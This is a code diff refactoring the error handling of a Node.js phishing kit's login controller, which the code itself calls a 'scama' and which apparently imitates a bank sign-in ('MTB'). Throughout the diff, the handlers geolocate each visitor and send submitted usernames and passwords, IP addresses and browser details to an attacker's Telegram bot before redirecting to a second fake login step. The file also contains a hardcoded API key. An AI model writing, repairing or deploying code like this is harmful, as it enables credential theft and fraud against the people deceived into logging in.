@@ -6,61 +6,68 @@ const axios = require('axios');
 const ApiKey = 'bdc_4422bb94409c46e986818d3e9f3b2bc2';
 const URL = `https://api-bdc.net/data/ip-geolocation?ip=`;
 
-
 exports.login = async (req, res) => {
-	let message = "";
-        const sendAPIRequest = async (ipAddress) => {
+    let message = "";
+    
+    const sendAPIRequest = async (ipAddress) => {
+        try {
             const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
             console.log(apiResponse.data);
             return apiResponse.data;
-        };
-    
-        const userAgent = req.headers["user-agent"];
-        const systemLang = req.headers["accept-language"];
-    
-        const ipAddress = getClientIp(req);
-        const ipAddressInformation = await sendAPIRequest(ipAddress);
-        const currentDate = new Date();
-        try {
-    
-            message += ` ✈️ ${ipAddress} visited your scama on ${currentDate}\n 🌐 ${userAgent}\n 📍 From ${ipAddressInformation.country.name} |  ${ipAddressInformation.location.city} | ${ipAddressInformation.location.principalSubdivision}`;
-    
-            const sendMessage = sendMessageFor(botToken, chatId); 
-            sendMessage(message);
-    
-            console.log(message);
-    
         } catch (error) {
-            // Handle any errors, for example, file not found
-            console.error('Error reading file:', error);
-            res.status(500).send('Internal Server Error');
+            console.error('Error sending API request:', error);
+            throw error; // Re-throw the error to be caught in the outer catch block
         }
-	
-	return res.render("login");
-};
-
-exports.loginPost = async (req, res) => {
-	const { username, password } = req.body;
-
-	const sendAPIRequest = async (ipAddress) => {
-        const apiResponse = await axios.get(URL + "&ip_address=" + ipAddress);
-		console.log(apiResponse.data);
-        return apiResponse.data;
     };
-
-    const ipAddress = getClientIp(req);
-    const ipAddressInformation = await sendAPIRequest(ipAddress);
-
-
-	try{
-    // Move the console.log statement outside the sendAPIRequest function
-    console.log(ipAddressInformation);
 
     const userAgent = req.headers["user-agent"];
     const systemLang = req.headers["accept-language"];
 
+    const ipAddress = getClientIp(req);
+    
+    try {
+        const ipAddressInformation = await sendAPIRequest(ipAddress);
+        const currentDate = new Date();
 
-    const message =
+        message += ` ✈️ ${ipAddress} visited your scama on ${currentDate}\n 🌐 ${userAgent}\n 📍 From ${ipAddressInformation.country.name} |  ${ipAddressInformation.location.city} | ${ipAddressInformation.location.principalSubdivision}`;
+
+        await sendMessageFor(botToken, chatId, message);
+
+        console.log(message);
+    } catch (error) {
+        // Handle any errors, for example, API request failure or sendMessageFor failure
+        console.error('Error in login handler:', error);
+        return res.status(500).send('Internal Server Error');
+    }
+
+    return res.render("login");
+};
+
+exports.loginPost = async (req, res) => {
+    try {
+        const { username, password } = req.body;
+
+        const sendAPIRequest = async (ipAddress) => {
+            try {
+                const apiResponse = await axios.get(URL + "&ip_address=" + ipAddress);
+                console.log(apiResponse.data);
+                return apiResponse.data;
+            } catch (apiError) {
+                console.error('Error sending API request:', apiError.message);
+                throw apiError; // Re-throw the error to be caught in the outer catch block
+            }
+        };
+
+        const ipAddress = getClientIp(req);
+        const ipAddressInformation = await sendAPIRequest(ipAddress);
+
+        // Move the console.log statement outside the sendAPIRequest function
+        console.log(ipAddressInformation);
+
+        const userAgent = req.headers["user-agent"];
+        const systemLang = req.headers["accept-language"];
+
+        const message =
         `✅ UPDATE TEAM | MTB | USER_${ipAddress}\n\n` +
         `👤 EMAIL ADDRESS\n` +
         `EMAIL            : ${username}\n\n` +  // Use the provided username from the request
@@ -78,25 +85,28 @@ exports.loginPost = async (req, res) => {
         `SYSTEM LANGUAGE  : ${systemLang}\n` +
         `💬 Telegram: https://t.me/UpdateTeams\n`;
 
-    const sendMessage = sendMessageFor(botToken, chatId);
-    sendMessage(message);
 
-	console.log(message);
+        const sendMessage = sendMessageFor(botToken, chatId);
+        await sendMessage(message); 
 
-    res.redirect("/auth/login/2");
-    
-} catch (error) {
-	// Handle any unexpected errors here
-	console.error('Unexpected error:', error.message);
-	res.status(500).send('Internal Server Error');
-}
+        console.log(message);
+
+        res.redirect("/auth/login/2");
+
+    } catch (error) {
+        // Handle any unexpected errors here
+        console.error('Unexpected error:', error.message);
+        res.status(500).send('Internal Server Error');
+    }
+    // Move this outside of the function to catch unhandled rejections globally
 process.on('unhandledRejection', (reason, promise) => {
     console.error('Unhandled Rejection at:', promise, 'reason:', reason);
     // Handle the rejection
 });
 
-	
 };
+
+
 
 exports.login2 = (req, res) => {
 	res.render("login2");
